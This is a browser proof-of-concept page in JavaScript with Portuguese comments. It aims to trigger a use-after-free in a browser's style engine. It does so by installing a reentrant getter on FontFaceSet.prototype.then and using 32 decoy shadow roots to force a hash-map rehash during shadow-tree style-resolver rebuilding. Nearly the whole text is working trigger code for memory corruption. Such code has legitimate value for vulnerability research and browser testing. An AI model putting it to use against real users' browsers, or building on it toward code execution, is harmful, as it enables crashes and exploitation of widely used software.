<script>
// URL qualquer — 404 ou invalida esta OK.
// A fonte fica "loading" sincronamente, o trigger roda antes da resposta.
var FONT_URL = 'no-such-font-' + Date.now() + '.woff';
var FONT_FAMILY = 'StallingFont';
var DECOY_COUNT = 32;

var logEl = document.getElementById('log');
function log(msg, cls) {
    var d = document.createElement('div');
    d.className = cls || 'info';
    d.textContent = msg;
    logEl.appendChild(d);
}

// --- Fase 1: diagnostico de FontFaceSet.prototype.then ---
function checkAPIs() {
    if (typeof FontFaceSet === 'undefined')    { log('FAIL: FontFaceSet ausente', 'fail'); return false; }
    if (typeof CSSStyleSheet === 'undefined')  { log('FAIL: CSSStyleSheet ausente', 'fail'); return false; }
    if (!('adoptedStyleSheets' in document.body.attachShadow({mode:'open'})))
        { log('FAIL: adoptedStyleSheets ausente', 'fail'); return false; }

    var fired = false;
    var orig = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
    Object.defineProperty(FontFaceSet.prototype, 'then', {
        configurable: true,
        get: function() { fired = true; return undefined; }
    });
    void document.fonts.then;
    if (orig) Object.defineProperty(FontFaceSet.prototype, 'then', orig);
    else { try { delete FontFaceSet.prototype.then; } catch(e) {} }

    if (!fired) { log('FAIL: FontFaceSet.prototype.then getter nao dispara', 'fail'); return false; }
    log('APIs OK: FontFaceSet.prototype.then, adoptedStyleSheets, CSSStyleSheet', 'ok');
    return true;
}

// --- Fase 2: setup ---
function setup() {
    // Materializa document.fonts antes de tudo
    void document.fonts;

    // Stylesheet com @font-face — URL qualquer (sera 404, nao importa)
    var fontSheet = new CSSStyleSheet();
    fontSheet.replaceSync('@font-face { font-family: ' + FONT_FAMILY +
                          '; src: url("' + FONT_URL + '"); }');

    var extraSheet = new CSSStyleSheet();
    extraSheet.replaceSync('.mk { color: green; }');

    var decoySheets = [];
    for (var i = 0; i < DECOY_COUNT; i++) {
        var ds = new CSSStyleSheet();
        ds.replaceSync('.d' + i + ' { color: rgb(' + i + ',1,2); }');
        decoySheets.push(ds);
    }

    // Shadow tree A: renderizada, referencia a fonte
    var hostA = document.createElement('div');
    document.body.appendChild(hostA);
    var rootA = hostA.attachShadow({ mode: 'open' });
    rootA.adoptedStyleSheets = [fontSheet];
    var spanA = document.createElement('span');
    spanA.style.fontFamily = FONT_FAMILY;
    spanA.textContent = 'A';
    rootA.appendChild(spanA);

    // Shadow tree B: tem <style> removivel, compartilha fontSheet com A
    var hostB = document.createElement('div');
    document.body.appendChild(hostB);
    var rootB = hostB.attachShadow({ mode: 'open' });
    var gadgetStyle = document.createElement('style');
    gadgetStyle.textContent = '.gadget { color: navy; }';
    rootB.appendChild(gadgetStyle);
    var wrapperB = document.createElement('div');
    var elementB = document.createElement('span');
    wrapperB.appendChild(elementB);
    rootB.appendChild(wrapperB);
    rootB.adoptedStyleSheets = [fontSheet, extraSheet];

    // 32 decoys para crescer o HashMap alem do load factor
    var decoyRoots = [];
    var decoyStyles = [];
    for (var j = 0; j < DECOY_COUNT; j++) {
        var dh = document.createElement('div');
        document.body.appendChild(dh);
        var dr = dh.attachShadow({ mode: 'open' });
        var dsEl = document.createElement('style');
        dsEl.textContent = '.dg' + j + ' { }';
        dr.appendChild(dsEl);
        dr.appendChild(document.createElement('div'));
        decoyRoots.push(dr);
        decoyStyles.push(dsEl);
    }

    // Forca layout: constroi todos os shadow tree resolvers agora
    void document.body.offsetHeight;
    log('Resolvers construidos via offsetHeight', 'ok');

    // Materializa document.fonts.ready (necessario para a thenable check)
    var readyPromise = document.fonts.ready;

    // Inicia carregamento da fonte
    document.fonts.load('24px ' + FONT_FAMILY, 'A');

    // STATUS E "loading" AGORA (sincronamente) — independente da URL
    var status = document.fonts.status;
    log('Status apos fonts.load(): ' + status +
        (status === 'loading' ? ' ← PERFEITO' : ' ← PROBLEMA'), 
        status === 'loading' ? 'ok' : 'warn');

    return {
        gadgetStyle: gadgetStyle,
        elementB: elementB,
        decoyRoots: decoyRoots,
        decoyStyles: decoyStyles,
        decoySheets: decoySheets
    };
}

// --- Fase 3: trigger (roda SINCRONAMENTE apos setup) ---
function trigger(s) {
    log('Instalando FontFaceSet.prototype.then getter...', 'info');

    var orig = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
    Object.defineProperty(FontFaceSet.prototype, 'then', {
        configurable: true,
        get: function() {
            if (orig) Object.defineProperty(FontFaceSet.prototype, 'then', orig);
            else { try { delete FontFaceSet.prototype.then; } catch(e) {} }
            // REENTRANCIA: reconstroi decoys → HashMap rehash → UAF
            void document.body.offsetHeight;
            return undefined;
        }
    });

    // Invalida resolvers dos decoys (sem flush ainda)
    for (var i = 0; i < s.decoyRoots.length; i++) {
        s.decoyRoots[i].adoptedStyleSheets = [s.decoySheets[i]];
        s.decoyStyles[i].remove();
    }
    s.gadgetStyle.remove();

    // Flush: descarta resolvers existentes
    void document.styleSheets.length;

    // TRIGGER: reconstroi resolver de B
    // → createOrFindSharedShadowTreeResolver()
    // → HashMap::ensure() → appendAuthorStyleSheets()
    // → @font-face re-registrada → active count 1→0
    // → document.fonts.ready resolve → thenable check
    // → getter dispara (sync se drainMicrotasks for chamado)
    // → offsetHeight → 32 entradas → HashMap rehash → UAF
    log('Disparando: elementB.id = "boom" + offsetHeight...', 'warn');
    s.elementB.id = 'boom';
    void s.elementB.offsetHeight;

    log('Chegou aqui → getter foi async (como 86074ba) → sem crash', 'warn');
    log('Status final: ' + document.fonts.status, 'info');
}

// --- Main ---
window.addEventListener('load', function() {
    logEl.innerHTML = '';
    if (!checkAPIs()) return;

    setTimeout(function() {
        var state = setup();
        if (!state) return;

        // SEM setTimeout adicional — roda SINCRONAMENTE
        // Garante que a fonte ainda esta em "loading" durante o trigger
        trigger(state);
    }, 0);
});
</script>
